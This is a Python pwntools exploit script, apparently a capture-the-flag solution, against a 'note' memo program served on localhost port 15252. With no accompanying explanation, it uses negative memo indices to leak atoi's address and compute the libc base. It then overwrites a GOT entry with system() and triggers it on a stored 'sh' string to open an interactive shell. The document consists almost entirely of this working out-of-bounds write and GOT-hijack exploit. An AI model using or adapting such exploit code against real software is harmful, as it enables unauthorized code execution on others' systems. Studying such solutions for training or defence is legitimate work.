from pwn import*

#context.log_level = 'debug'
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
def write_memo(idx, content):
    p.recvuntil(b'> ')
    p.sendline(b'1')
    p.recvuntil(b' : ')
    p.sendline(str(idx).encode())
    p.recvuntil(b' : ')
    p.send(content)

def read_memo(idx):
    p.recvuntil(b'> ')
    p.sendline(b'2')
    p.recvuntil(b': ')
    p.sendline(str(idx).encode())

#p = process("./note")
p = remote('localhost', 15252)
#infinite memo on!
write_memo(-4, p64(negate(20, width = 64)))
read_memo(-13)
atoi = u64(p.recv(6).ljust(8,b'\x00'))
libc_base = atoi - libc.symbols['atoi']
system = libc_base + libc.symbols['system']
print('system :', hex(system))
write_memo(1, b'sh\n')
write_memo(-15, p64(system))

sleep(0.1)
p.sendline(b'2')
sleep(0.1)
p.sendline(b'1')
p.interactive()


